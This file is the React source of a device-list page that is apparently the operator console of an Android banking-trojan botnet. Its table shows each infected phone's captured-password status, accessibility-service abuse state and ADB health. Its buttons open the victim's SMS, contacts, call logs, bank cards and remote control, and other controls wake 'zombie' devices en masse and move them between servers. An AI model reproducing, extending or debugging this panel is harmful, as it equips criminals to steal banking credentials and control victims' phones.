import { useCallback, useEffect, useMemo, useRef, useState, type CSSProperties } from "react";
import {
  batchUpdateDeviceGroup,
  createDeviceGroup,
  deleteDeviceGroup,
  fetchDeviceFilterOptions,
  fetchDeviceGroups,
  fetchDevicesPage,
  fetchPeerServers,
  fetchClientApkConfig,
  clearZombieWake,
  fetchZombieWakeStatus,
  transferDevices,
  triggerZombieWake,
  updateDeviceGroup,
  updateDeviceRemark,
  type FetchDevicesPageParams,
  type PeerServer,
} from "../api/client";
import { useAdminWebSocket } from "../hooks/useAdminWebSocket";
import type { Device, DeviceFilterOptions, DeviceGroup } from "../types";
import { openControlTab } from "../utils/navigation";
import {
  formatDateTime,
  formatNetworkType,
  formatScreenSize,
  formatSdk,
} from "../utils/format";
import { DevicePaymentModal } from "../components/DevicePaymentModal";
import { DeviceSmsModal } from "../components/DeviceSmsModal";
import { canUpdateClientApk } from "../utils/client-apk-version";
import { describeA11yProbe, describeA11ySetting, formatRelativeTime } from "../utils/accessibility-view";
import "../styles/device-list.css";
import { useI18n, t } from "../i18n";


const PAGE_SIZE_OPTIONS = [20, 50, 100, 200];

type HealthTone = "ok" | "warn" | "bad" | "idle";

function healthDotStyle(tone: HealthTone): CSSProperties {
  const bg =
    tone === "ok" ? "#22c55e" : tone === "warn" ? "#eab308" : tone === "bad" ? "#ef4444" : "#9ca3af";
  return {
    display: "inline-block",
    width: 8,
    height: 8,
    borderRadius: "50%",
    background: bg,
  };
}

function a11yTone(rttMs: number | null): HealthTone {
  if (rttMs == null) return "idle";
  if (rttMs <= 800) return "ok";
  if (rttMs <= 2500) return "warn";
  return "bad";
}

/** `describeA11y*` 的 tone → 现有 tag 类名 */
function a11yTagClass(tone: "ok" | "warn" | "danger" | "idle"): string {
  if (tone === "ok") return "tag tag-info";
  if (tone === "warn") return "tag tag-warn";
  if (tone === "danger") return "tag tag-danger";
  return "tag tag-muted";
}

/** all = 全部；ungrouped = 未分组；其余为 group uuid */
type GroupFilterKey = "all" | "ungrouped" | string;

const EMPTY_FILTERS: FetchDevicesPageParams = {
  deviceId: "",
  remark: "",
  bindCode: "",
  groupId: "",
  localeLanguage: "",
  localeRegion: "",
  brand: "",
  accessibilityStatus: "",
  isOnline: "",
  hasPassword: "",
  dateFrom: "",
  dateTo: "",
};

function groupIdFromKey(key: GroupFilterKey): string {
  return key === "all" ? "" : key;
}

function isDeviceOnline(device: Device, onlineDeviceIds: string[]) {
  return onlineDeviceIds.includes(device.deviceId);
}

export function DeviceListPage() {
  useI18n();
  const [filters, setFilters] = useState<FetchDevicesPageParams>({ ...EMPTY_FILTERS });
  const [appliedFilters, setAppliedFilters] = useState<FetchDevicesPageParams>({ ...EMPTY_FILTERS });
  const [groupFilter, setGroupFilter] = useState<GroupFilterKey>("all");
  const [groups, setGroups] = useState<DeviceGroup[]>([]);
  const [ungroupedCount, setUngroupedCount] = useState(0);
  const [totalCount, setTotalCount] = useState(0);
  const [page, setPage] = useState(1);
  const [pageSize, setPageSize] = useState(100);
  const [items, setItems] = useState<Device[]>([]);
  const [total, setTotal] = useState(0);
  const [onlineDeviceIds, setOnlineDeviceIds] = useState<string[]>([]);
  const [filterOptions, setFilterOptions] = useState<DeviceFilterOptions>({
    brands: [],
    languages: [],
    regions: [],
  });
  const [loading, setLoading] = useState(false);
  const [errorText, setErrorText] = useState<string | null>(null);
  const [selectedIds, setSelectedIds] = useState<Set<string>>(new Set());
  const [moveTargetGroupId, setMoveTargetGroupId] = useState<string>("");
  const [transferPeerId, setTransferPeerId] = useState<string>("");
  const [peerServers, setPeerServers] = useState<PeerServer[]>([]);
  const [clientApkVersion, setClientApkVersion] = useState("");
  const [transferring, setTransferring] = useState(false);
  const [zombieWaking, setZombieWaking] = useState(false);
  const [zombieClearing, setZombieClearing] = useState(false);
  const [zombieWakeHint, setZombieWakeHint] = useState<string | null>(null);
  const [paymentModalDevice, setPaymentModalDevice] = useState<Device | null>(null);
  const [smsModalDevice, setSmsModalDevice] = useState<Device | null>(null);
  const onlineRefreshTimerRef = useRef<number | null>(null);

  const loadGroups = useCallback(async () => {
    try {
      const data = await fetchDeviceGroups();
      setGroups(data.groups);
      setUngroupedCount(data.ungroupedCount);
      setTotalCount(data.totalCount);
    } catch {
      // 侧栏失败不阻断列表
    }
  }, []);

  const loadPage = useCallback(async (options?: { silent?: boolean }) => {
    const silent = Boolean(options?.silent);
    if (!silent) {
      setLoading(true);
    }
    // silent 刷新不清错误：避免重连风暴时刷 NetworkError 红条
    if (!silent) {
      setErrorText(null);
    }
    try {
      const data = await fetchDevicesPage({
        ...appliedFilters,
        page,
        pageSize,
      });
      setItems(data.items);
      setTotal(data.total);
      // 在线态以 WS 为准；silent 时用 HTTP 结果覆盖会和重连竞态，导致在线徽章闪烁
      if (!silent) {
        setOnlineDeviceIds(data.onlineDeviceIds);
      }
    } catch (error) {
      if (!silent) {
        const message = error instanceof Error ? error.message : "load_failed";
        setErrorText(message);
      }
    } finally {
      if (!silent) {
        setLoading(false);
      }
    }
  }, [appliedFilters, page, pageSize]);

  useEffect(() => {
    void loadPage();
  }, [loadPage]);

  useEffect(() => {
    void loadGroups();
  }, [loadGroups]);

  useEffect(() => {
    void fetchDeviceFilterOptions()
      .then(setFilterOptions)
      .catch(() => {
        // 忽略
      });
  }, []);

  useEffect(() => {
    void fetchClientApkConfig()
      .then((data) => setClientApkVersion(data.version ?? ""))
      .catch(() => {
        // 配置失败不挡列表
      });
  }, []);

  useEffect(() => {
    void fetchPeerServers()
      .then((data) => setPeerServers(data.peers.filter((peer) => peer.enabled === 1)))
      .catch(() => {
        // 未开转移或接口失败时不挡列表
      });
  }, []);

  useEffect(() => {
    const loadHint = () => {
      void fetchZombieWakeStatus()
        .then((status) => {
          if (status.needWake) {
            setZombieWakeHint(formatZombieWakeHint(status.remainingMs));
          } else {
            setZombieWakeHint(null);
          }
        })
        .catch(() => {
          // 状态失败不阻断列表
        });
    };
    loadHint();
    const timer = window.setInterval(loadHint, 30_000);
    return () => window.clearInterval(timer);
  }, []);

  useAdminWebSocket({
    onSnapshot: (_devices, nextOnlineDeviceIds) => {
      setOnlineDeviceIds(nextOnlineDeviceIds);
    },
    onDeviceOnline: (deviceId) => {
      setOnlineDeviceIds((current) =>
        current.includes(deviceId) ? current : [...current, deviceId],
      );
    },
    onDeviceOffline: (deviceId) => {
      setOnlineDeviceIds((current) => current.filter((id) => id !== deviceId));
    },
    onA11yProbe: (deviceId, probe) => {
      setItems((current) =>
        current.map((device) =>
          device.deviceId === deviceId ? { ...device, accessibilityProbe: probe } : device,
        ),
      );
    },
    onLog: (entry) => {
      if (entry.title === "设备上线" || entry.title === "设备离线") {
        // 控制通道重连会短时间上下线；静默+防抖刷新，避免加载闪与请求风暴
        if (onlineRefreshTimerRef.current != null) {
          window.clearTimeout(onlineRefreshTimerRef.current);
        }
        onlineRefreshTimerRef.current = window.setTimeout(() => {
          onlineRefreshTimerRef.current = null;
          void loadPage({ silent: true });
          void loadGroups();
        }, 1500);
      }
    },
  });

  useEffect(() => {
    return () => {
      if (onlineRefreshTimerRef.current != null) {
        window.clearTimeout(onlineRefreshTimerRef.current);
      }
    };
  }, []);

  const totalPages = Math.max(1, Math.ceil(total / pageSize));

  const allChecked = useMemo(
    () => items.length > 0 && items.every((item) => selectedIds.has(item.deviceId)),
    [items, selectedIds],
  );

  const groupNameById = useMemo(() => {
    const map = new Map<string, string>();
    groups.forEach((group) => map.set(group.id, group.name));
    return map;
  }, [groups]);

  function updateFilter<K extends keyof FetchDevicesPageParams>(
    key: K,
    value: FetchDevicesPageParams[K],
  ) {
    setFilters((current) => ({ ...current, [key]: value }));
  }

  function selectGroup(key: GroupFilterKey) {
    setGroupFilter(key);
    setPage(1);
    setSelectedIds(new Set());
    const nextGroupId = groupIdFromKey(key);
    setFilters((current) => ({ ...current, groupId: nextGroupId }));
    setAppliedFilters((current) => ({ ...current, groupId: nextGroupId }));
  }

  function handleSearch() {
    setPage(1);
    setAppliedFilters({ ...filters, groupId: groupIdFromKey(groupFilter) });
  }

  function handleReset() {
    setFilters({ ...EMPTY_FILTERS, groupId: groupIdFromKey(groupFilter) });
    setAppliedFilters({ ...EMPTY_FILTERS, groupId: groupIdFromKey(groupFilter) });
    setPage(1);
    setSelectedIds(new Set());
  }

  function toggleAll(checked: boolean) {
    if (!checked) {
      setSelectedIds(new Set());
      return;
    }
    setSelectedIds(new Set(items.map((item) => item.deviceId)));
  }

  function toggleOne(deviceId: string, checked: boolean) {
    setSelectedIds((current) => {
      const next = new Set(current);
      if (checked) {
        next.add(deviceId);
      } else {
        next.delete(deviceId);
      }
      return next;
    });
  }

  async function handleRemark(device: Device) {
    const nextRemark = window.prompt(t("编辑备注"), device.remark ?? "");
    if (nextRemark == null) {
      return;
    }
    try {
      await updateDeviceRemark(device.deviceId, nextRemark.trim());
      void loadPage();
    } catch (error) {
      const message = error instanceof Error ? error.message : "update_failed";
      window.alert(t("备注更新失败：{0}", { 0: message }));
    }
  }

  function formatZombieWakeHint(
    remainingMs: number,
    nudgedOnline?: number,
    nudgedFcm?: boolean,
    fcmReason?: string,
  ) {
    const minutes = Math.max(1, Math.ceil(remainingMs / 60_000));
    const nudge =
      typeof nudgedOnline === "number" ? t("，已推送在线 {0} 台", { 0: nudgedOnline }) : "";
    // FCM 失败时仍提示，避免静默失败；成功不再展示「已群发 FCM」。
    const fcm =
      nudgedFcm === false
        ? t("，FCM 群发失败{0}", { 0: fcmReason ? `（${fcmReason}）` : "" })
        : "";
    return t("可发现窗口约 {0} 分钟（亮屏常亮 5 分钟）{1}{2}", { 0: minutes, 1: nudge, 2: fcm });
  }

  async function handleZombieWake() {
    if (
      !window.confirm(
        t("确认唤醒全部设备？\n可发现窗口约 30 分钟（覆盖深睡轮询）。\n设备拉到后亮屏常亮约 5 分钟。"),
      )
    ) {
      return;
    }
    setZombieWaking(true);
    try {
      const status = await triggerZombieWake();
      setZombieWakeHint(
        formatZombieWakeHint(
          status.remainingMs,
          status.nudgedOnline,
          status.nudgedFcm,
          status.fcmReason,
        ),
      );
    } catch (error) {
      const message = error instanceof Error ? error.message : "zombie_wake_failed";
      window.alert(t("唤醒僵尸失败：{0}", { 0: message }));
    } finally {
      setZombieWaking(false);
    }
  }

  async function handleClearZombieWake() {
    if (!window.confirm(t("确认清除全局唤醒？在线设备会立刻停常亮，离线设备下次轮询后停止。"))) {
      return;
    }
    setZombieClearing(true);
    try {
      const status = await clearZombieWake();
      setZombieWakeHint(
        typeof status.nudgedOnline === "number"
          ? t("已清除唤醒（已通知在线 {0} 台）", { 0: status.nudgedOnline })
          : null,
      );
      window.setTimeout(() => {
        setZombieWakeHint((current) =>
          current?.startsWith(t("已清除唤醒")) ? null : current,
        );
      }, 5_000);
    } catch (error) {
      const message = error instanceof Error ? error.message : "zombie_wake_clear_failed";
      window.alert(t("清除唤醒失败：{0}", { 0: message }));
    } finally {
      setZombieClearing(false);
    }
  }

  async function handleCreateGroup() {
    const name = window.prompt(t("新建分组名称"));
    if (name == null || !name.trim()) {
      return;
    }
    try {
      const group = await createDeviceGroup(name.trim());
      await loadGroups();
      selectGroup(group.id);
    } catch (error) {
      const message = error instanceof Error ? error.message : "create_failed";
      window.alert(t("创建分组失败：{0}", { 0: message }));
    }
  }

  async function handleRenameGroup(group: DeviceGroup) {
    const name = window.prompt(t("重命名分组"), group.name);
    if (name == null || !name.trim() || name.trim() === group.name) {
      return;
    }
    try {
      await updateDeviceGroup(group.id, { name: name.trim() });
      await loadGroups();
    } catch (error) {
      const message = error instanceof Error ? error.message : "update_failed";
      window.alert(t("重命名失败：{0}", { 0: message }));
    }
  }

  async function handleDeleteGroup(group: DeviceGroup) {
    if (!window.confirm(t("删除分组「{0}」？组内设备将回到未分组。", { 0: group.name }))) {
      return;
    }
    try {
      await deleteDeviceGroup(group.id);
      if (groupFilter === group.id) {
        selectGroup("all");
      }
      await loadGroups();
      void loadPage();
    } catch (error) {
      const message = error instanceof Error ? error.message : "delete_failed";
      window.alert(t("删除失败：{0}", { 0: message }));
    }
  }

  async function handleBatchTransfer() {
    if (selectedIds.size === 0 || !transferPeerId) {
      return;
    }
    const onlineSelected = items.filter(
      (item) => selectedIds.has(item.deviceId) && isDeviceOnline(item, onlineDeviceIds),
    );
    if (onlineSelected.length === 0) {
      window.alert(t("所选设备都不在线，无法转移"));
      return;
    }
    if (
      !window.confirm(
        t("将 {0} 台在线设备转移到所选服务器？离线的会跳过。", { 0: onlineSelected.length }),
      )
    ) {
      return;
    }
    setTransferring(true);
    try {
      const data = await transferDevices(
        onlineSelected.map((item) => item.deviceId),
        transferPeerId,
      );
      const failed = data.results.filter((item) => !item.ok);
      const okCount = data.results.filter((item) => item.ok).length;
      if (failed.length > 0) {
        window.alert(
          t("成功 {0} 台，失败 {1} 台：\n{2}", { 0: okCount, 1: failed.length, 2: failed
            .map((item) => `${item.deviceId}: ${item.error ?? "unknown"}`)
            .join("\n") }),
        );
      } else {
        window.alert(t("已转移 {0} 台，请到目标面板查看", { 0: okCount }));
      }
      setSelectedIds(new Set());
      await loadGroups();
      void loadPage();
    } catch (error) {
      const message = error instanceof Error ? error.message : "transfer_failed";
      window.alert(t("转移失败：{0}", { 0: message }));
    } finally {
      setTransferring(false);
    }
  }

  async function handleBatchMove() {
    if (selectedIds.size === 0) {
      return;
    }
    const target = moveTargetGroupId.trim() === "" ? null : moveTargetGroupId.trim();
    try {
      await batchUpdateDeviceGroup([...selectedIds], target);
      setSelectedIds(new Set());
      await loadGroups();
      void loadPage();
    } catch (error) {
      const message = error instanceof Error ? error.message : "move_failed";
      window.alert(t("移动失败：{0}", { 0: message }));
    }
  }

  return (
    <div className="device-list-page device-list-page--with-groups">
      <aside className="device-group-sidebar">
        <div className="device-group-sidebar-header">
          <span>{t("设备分组")}</span>
          <button type="button" className="device-btn device-btn-sm" onClick={() => void handleCreateGroup()}>
            {t("新建")}
          </button>
        </div>
        <button
          type="button"
          className={`device-group-item${groupFilter === "all" ? " is-active" : ""}`}
          onClick={() => selectGroup("all")}
        >
          <span>{t("全部")}</span>
          <span className="device-group-count">{totalCount}</span>
        </button>
        <button
          type="button"
          className={`device-group-item${groupFilter === "ungrouped" ? " is-active" : ""}`}
          onClick={() => selectGroup("ungrouped")}
        >
          <span>{t("未分组")}</span>
          <span className="device-group-count">{ungroupedCount}</span>
        </button>
        <div className="device-group-divider" />
        {groups.map((group) => (
          <div
            key={group.id}
            className={`device-group-row${groupFilter === group.id ? " is-active" : ""}`}
          >
            <button
              type="button"
              className="device-group-item"
              onClick={() => selectGroup(group.id)}
            >
              <span className="device-group-name" title={group.name}>
                {group.name}
              </span>
              <span className="device-group-count">{group.deviceCount}</span>
            </button>
            <div className="device-group-actions">
              <button
                type="button"
                title={t("重命名")}
                onClick={() => void handleRenameGroup(group)}
              >
                {t("改")}
              </button>
              <button
                type="button"
                title={t("删除")}
                onClick={() => void handleDeleteGroup(group)}
              >
                {t("删")}
              </button>
            </div>
          </div>
        ))}
        {groups.length === 0 ? (
          <div className="device-group-empty">{t("暂无自定义分组")}</div>
        ) : null}
      </aside>

      <div className="device-list-main">
      <section className="device-list-filters">
        <div className="device-list-filter-grid">
          <label>
            <input
              value={filters.deviceId ?? ""}
              placeholder={t("设备号")}
              aria-label={t("设备号")}
              onChange={(event) => updateFilter("deviceId", event.target.value)}
            />
          </label>
          <label>
            <input
              value={filters.remark ?? ""}
              placeholder={t("备注")}
              aria-label={t("备注")}
              onChange={(event) => updateFilter("remark", event.target.value)}
            />
          </label>
          <label>
            <input
              value={filters.bindCode ?? ""}
              placeholder={t("绑定码")}
              aria-label={t("绑定码")}
              onChange={(event) => updateFilter("bindCode", event.target.value)}
            />
          </label>
          <label>
            <select
              value={filters.localeLanguage ?? ""}
              aria-label={t("系统语言")}
              onChange={(event) => updateFilter("localeLanguage", event.target.value)}
            >
              <option value="">{t("系统语言")}</option>
              {filterOptions.languages.map((item) => (
                <option key={item} value={item}>
                  {item}
                </option>
              ))}
            </select>
          </label>
          <label>
            <select
              value={filters.localeRegion ?? ""}
              aria-label={t("地区")}
              onChange={(event) => updateFilter("localeRegion", event.target.value)}
            >
              <option value="">{t("地区")}</option>
              {filterOptions.regions.map((item) => (
                <option key={item} value={item}>
                  {item}
                </option>
              ))}
            </select>
          </label>
          <label>
            <select
              value={filters.brand ?? ""}
              aria-label={t("品牌")}
              onChange={(event) => updateFilter("brand", event.target.value)}
            >
              <option value="">{t("品牌")}</option>
              {filterOptions.brands.map((item) => (
                <option key={item} value={item}>
                  {item}
                </option>
              ))}
            </select>
          </label>
          <label>
            <select
              value={filters.accessibilityStatus ?? ""}
              aria-label={t("无障碍")}
              onChange={(event) => updateFilter("accessibilityStatus", event.target.value)}
            >
              <option value="">{t("无障碍")}</option>
              <option value={t("允许")}>{t("允许")}</option>
              <option value={t("拒绝")}>{t("拒绝")}</option>
              <option value={t("未绑定")}>{t("未绑定")}</option>
            </select>
          </label>
          <label>
            <select
              value={filters.isOnline ?? ""}
              aria-label={t("在线状态")}
              onChange={(event) => updateFilter("isOnline", event.target.value)}
            >
              <option value="">{t("在线状态")}</option>
              <option value="1">{t("在线")}</option>
              <option value="0">{t("离线")}</option>
            </select>
          </label>
          <label>
            <select
              value={filters.hasPassword ?? ""}
              aria-label={t("是否获取到密码")}
              onChange={(event) => updateFilter("hasPassword", event.target.value)}
            >
              <option value="">{t("是否获取到密码")}</option>
              <option value="1">{t("已获取")}</option>
              <option value="0">{t("未获取")}</option>
            </select>
          </label>
          <label>
            <input
              type="date"
              value={filters.dateFrom ?? ""}
              aria-label={t("安装时间起")}
              title={t("安装时间起")}
              onChange={(event) => updateFilter("dateFrom", event.target.value)}
            />
          </label>
          <label>
            <input
              type="date"
              value={filters.dateTo ?? ""}
              aria-label={t("安装时间止")}
              title={t("安装时间止")}
              onChange={(event) => updateFilter("dateTo", event.target.value)}
            />
          </label>
        </div>
        <div className="device-list-filter-actions">
          <button type="button" className="device-btn device-btn-primary" onClick={handleSearch}>
            {t("搜索")}
          </button>
          <button type="button" className="device-btn" onClick={handleReset}>
            {t("重置")}
          </button>
          <button
            type="button"
            className="device-btn device-btn-primary"
            disabled={zombieWaking || zombieClearing}
            title={t("全局 flag 约 30 分钟可发现；设备拉到后亮屏常亮约 5 分钟")}
            onClick={() => void handleZombieWake()}
          >
            {zombieWaking ? t("唤醒中…") : t("唤醒僵尸")}
          </button>
          <button
            type="button"
            className="device-btn"
            disabled={zombieWaking || zombieClearing}
            title={t("清除全局唤醒 flag，并通知在线设备停止常亮")}
            onClick={() => void handleClearZombieWake()}
          >
            {zombieClearing ? t("清除中…") : t("清除唤醒")}
          </button>
          {zombieWakeHint ? (
            <span className="device-list-status">{zombieWakeHint}</span>
          ) : null}
          {selectedIds.size > 0 ? (
            <div className="device-batch-move">
              <span>{t("已选")} {selectedIds.size} {t("台")}</span>
              <select
                value={moveTargetGroupId}
                aria-label={t("目标分组")}
                onChange={(event) => setMoveTargetGroupId(event.target.value)}
              >
                <option value="">{t("移到：未分组")}</option>
                {groups.map((group) => (
                  <option key={group.id} value={group.id}>
                    {t("移到：")}{group.name}
                  </option>
                ))}
              </select>
              <button
                type="button"
                className="device-btn device-btn-primary"
                onClick={() => void handleBatchMove()}
              >
                {t("移动")}
              </button>
              {peerServers.length > 0 ? (
                <>
                  <select
                    value={transferPeerId}
                    aria-label={t("目标服务器")}
                    onChange={(event) => setTransferPeerId(event.target.value)}
                  >
                    <option value="">{t("转移到…")}</option>
                    {peerServers.map((peer) => (
                      <option key={peer.id} value={peer.id}>
                        {peer.name}
                      </option>
                    ))}
                  </select>
                  <button
                    type="button"
                    className="device-btn device-btn-primary"
                    disabled={!transferPeerId || transferring}
                    onClick={() => void handleBatchTransfer()}
                  >
                    {transferring ? t("转移中…") : t("转移")}
                  </button>
                </>
              ) : null}
            </div>
          ) : null}
          {loading ? <span className="device-list-status">{t("加载中…")}</span> : null}
          {errorText ? <span className="device-list-error">{errorText}</span> : null}
        </div>
      </section>

      <section className="device-list-table-wrap">
        <table className="device-list-table">
          <thead>
            <tr>
              <th>
                <input
                  type="checkbox"
                  checked={allChecked}
                  onChange={(event) => toggleAll(event.target.checked)}
                />
              </th>
              <th>{t("序号")}</th>
              <th>{t("应用信息")}</th>
              <th>{t("终端信息")}</th>
              <th>{t("设备信息")}</th>
              <th>{t("用户信息")}</th>
              <th>{t("网络信息")}</th>
              <th>{t("操作")}</th>
            </tr>
          </thead>
          <tbody>
            {items.map((device, index) => {
              const online = isDeviceOnline(device, onlineDeviceIds);
              const rowIndex = (page - 1) * pageSize + index + 1;
              const groupLabel = device.groupId
                ? groupNameById.get(device.groupId) ?? t("未知分组")
                : t("未分组");
              return (
                <tr key={device.deviceId}>
                  <td>
                    <input
                      type="checkbox"
                      checked={selectedIds.has(device.deviceId)}
                      onChange={(event) => toggleOne(device.deviceId, event.target.checked)}
                    />
                  </td>
                  <td>{rowIndex}</td>
                  <td className="device-cell-block">
                    <div>
                      <span className="device-cell-label">{t("设备号")}</span>
                      {device.deviceId}
                    </div>
                    <div>
                      <span className="device-cell-label">{t("B包版本")}</span>
                      {device.appVersion ?? "-"}
                      {canUpdateClientApk(clientApkVersion, device.appVersion) ? (
                        <>
                          {" "}
                          <span className="tag tag-info">{t("可更新")}</span>
                        </>
                      ) : null}
                    </div>
                    <div>
                      <span className="device-cell-label">{t("安装时间")}</span>
                      {formatDateTime(device.createdAt)}
                    </div>
                    <div>
                      <span className="device-cell-label">{t("最后更新")}</span>
                      {formatDateTime(device.updatedAt)}
                    </div>
                  </td>
                  <td className="device-cell-block">
                    <div>
                      <span className="device-cell-label">{t("语言")}</span>
                      {device.localeLanguage ?? "-"}
                    </div>
                    <div>
                      <span className="device-cell-label">{t("地区")}</span>
                      {device.localeRegion ?? "-"}
                    </div>
                    <div>
                      <span className="device-cell-label">{t("终端IP")}</span>
                      {device.clientIp ?? "-"}
                    </div>
                    <div>
                      <span className="device-cell-label">{t("绑定码")}</span>
                      {device.bindCode ?? "-"}
                    </div>
                    <div>
                      <span className="device-cell-label">{t("充电状态")}</span>
                      <span className={device.isCharging ? "tag tag-success" : "tag tag-danger"}>
                        {device.isCharging ? t("是") : t("否")}
                      </span>
                    </div>
                  </td>
                  <td className="device-cell-block">
                    <div>
                      <span className="device-cell-label">{t("品牌")}</span>
                      {device.brand ?? "-"}
                    </div>
                    <div>
                      <span className="device-cell-label">{t("型号")}</span>
                      {device.model ?? "-"}
                      {device.appVersion ? ` · B ${device.appVersion}` : ""}
                    </div>
                    <div>
                      <span className="device-cell-label">{t("屏幕")}</span>
                      {formatScreenSize(device.screenWidth, device.screenHeight)}
                    </div>
                    <div>
                      <span className="device-cell-label">{t("版本/SDK")}</span>
                      {formatSdk(device.androidVersion, device.sdkInt)}
                    </div>
                    <div>
                      <span className="device-cell-label">{t("密码")}</span>
                      <span className={device.hasPassword ? "tag tag-success" : "tag tag-danger"}>
                        {device.hasPassword ? t("已获取") : t("未获取")}
                      </span>
                    </div>
                  </td>
                  <td className="device-cell-block">
                    <div>
                      <span className="device-cell-label">{t("分组")}</span>
                      {groupLabel}
                    </div>
                    <div>
                      <span className="device-cell-label">{t("保护")}</span>
                      <span className={device.protectionEnabled ? "tag tag-info" : "tag"}>
                        {device.protectionEnabled ? t("启用") : t("未启用")}
                      </span>
                    </div>
                    <div>
                      <span className="device-cell-label">{t("电量")}</span>
                      {device.batteryLevel != null ? `${device.batteryLevel}%` : "-"}
                    </div>
                    <div>
                      <span className="device-cell-label">{t("备注")}</span>
                      {device.remark ?? "-"}
                    </div>
                    <div className="device-cell-a11y">
                      {(() => {
                        const setting = describeA11ySetting({
                          isOnline: online,
                          status: device.accessibilityStatus,
                          lastHeartbeatAt: device.lastHeartbeatAt,
                        });
                        const probe = describeA11yProbe({
                          isOnline: online,
                          probe: device.accessibilityProbe,
                          settingStatus: device.accessibilityStatus,
                        });
                        return (
                          <>
                            <div>
                              <span className="device-cell-label">{t("无障碍")}</span>
                              <span
                                className={a11yTagClass(setting.tone)}
                                title={setting.title}
                              >
                                {setting.label}
                              </span>
                              {setting.stale ? (
                                <span
                                  className="device-cell-hint"
                                  title={t("该值取自离线前的最后一跳心跳，不代表当前状态")}
                                >
                                  {t("离线前")} {device.accessibilityStatus}
                                </span>
                              ) : null}
                            </div>
                            <div>
                              <span className="device-cell-label">{t("实连")}</span>
                              <span className={a11yTagClass(probe.tone)} title={probe.title}>
                                {probe.label}
                              </span>
                            </div>
                          </>
                        );
                      })()}
                    </div>
                  </td>
                  <td className="device-cell-block">
                    <div>
                      <span className="device-cell-label">{t("网络类型")}</span>
                      {formatNetworkType(device.networkType)}
                    </div>
                    <div>
                      <span className="device-cell-label">{t("在线状态")}</span>
                      <span className={online ? "tag tag-info" : "tag tag-muted"}>
                        {online ? t("在线") : t("离线")}
                      </span>
                      {!online ? (
                        <span
                          className="device-cell-hint"
                          title={t("最后一次心跳：{0}", { 0: formatDateTime(device.lastHeartbeatAt) })}
                        >
                          {formatRelativeTime(
                            device.lastHeartbeatAt
                              ? Date.parse(device.lastHeartbeatAt)
                              : null,
                          )}
                        </span>
                      ) : null}
                      <span
                        className="health-dots"
                        style={{
                          display: "inline-flex",
                          gap: 4,
                          marginLeft: 8,
                          verticalAlign: "middle",
                        }}
                        title={t("控制 {0} / a11y {1} / ADB {2}", { 0: device.controlOk ? "OK" : "DOWN", 1: device.a11yRttMs != null ? `${device.a11yRttMs}ms` : "N/A", 2: device.adbOk ? "OK" : "DOWN" })}
                      >
                        <span
                          aria-label="control"
                          style={healthDotStyle(device.controlOk === true ? "ok" : "bad")}
                        />
                        <span
                          aria-label="a11y"
                          style={healthDotStyle(a11yTone(device.a11yRttMs ?? null))}
                        />
                        <span
                          aria-label="adb"
                          style={healthDotStyle(device.adbOk === true ? "ok" : "bad")}
                        />
                      </span>
                    </div>
                    <div>
                      <span className="device-cell-label">{t("屏幕状态")}</span>
                      {device.screenOn ? t("开启") : t("关闭")}
                    </div>
                    <div>
                      <span className="device-cell-label">{t("最近启动")}</span>
                      {formatDateTime(device.lastBootAt ?? device.lastHeartbeatAt)}
                    </div>
                  </td>
                  <td>
                    <div className="device-action-grid">
                      <button
                        type="button"
                        className="device-action-btn device-action-btn-blue"
                        onClick={() => void handleRemark(device)}
                      >
                        {t("备注")}
                      </button>
                      <button type="button" className="device-action-btn device-action-btn-green">
                        {t("通讯录")}
                      </button>
                      <button
                        type="button"
                        className="device-action-btn device-action-btn-orange"
                        onClick={() => setSmsModalDevice(device)}
                      >
                        {t("短信列表")}
                      </button>
                      <button type="button" className="device-action-btn device-action-btn-teal">
                        {t("通话记录")}
                      </button>
                      <button
                        type="button"
                        className="device-action-btn device-action-btn-red"
                        onClick={() => openControlTab(device.deviceId)}
                      >
                        {t("远程控制")}
                      </button>
                      <button
                        type="button"
                        className="device-action-btn device-action-btn-purple"
                        onClick={() => setPaymentModalDevice(device)}
                      >
                        {t("查看银行卡")}
                      </button>
                    </div>
                  </td>
                </tr>
              );
            })}
            {!loading && items.length === 0 ? (
              <tr>
                <td colSpan={8} className="device-empty-row">
                  {t("暂无设备数据")}
                </td>
              </tr>
            ) : null}
          </tbody>
        </table>
      </section>

      <footer className="device-list-pagination">
        <span>{t("共")} {total} {t("条")}</span>
        <label>
          {t("每页")}
          <select
            value={pageSize}
            onChange={(event) => {
              setPageSize(Number(event.target.value));
              setPage(1);
            }}
          >
            {PAGE_SIZE_OPTIONS.map((size) => (
              <option key={size} value={size}>
                {size} {t("条/页")}
              </option>
            ))}
          </select>
        </label>
        <div className="device-pagination-pages">
          <button
            type="button"
            className="device-btn"
            disabled={page <= 1}
            onClick={() => setPage((current) => Math.max(1, current - 1))}
          >
            {t("上一页")}
          </button>
          <span>
            {page} / {totalPages}
          </span>
          <button
            type="button"
            className="device-btn"
            disabled={page >= totalPages}
            onClick={() => setPage((current) => Math.min(totalPages, current + 1))}
          >
            {t("下一页")}
          </button>
        </div>
      </footer>
      </div>

      <DevicePaymentModal
        open={paymentModalDevice != null}
        deviceId={paymentModalDevice?.deviceId ?? null}
        deviceLabel={paymentModalDevice?.model ?? paymentModalDevice?.deviceId ?? undefined}
        onClose={() => setPaymentModalDevice(null)}
      />

      <DeviceSmsModal
        open={smsModalDevice != null}
        deviceId={smsModalDevice?.deviceId ?? null}
        deviceLabel={smsModalDevice?.model ?? smsModalDevice?.deviceId ?? undefined}
        isOnline={
          smsModalDevice ? onlineDeviceIds.includes(smsModalDevice.deviceId) : false
        }
        onClose={() => setSmsModalDevice(null)}
      />
    </div>
  );
}
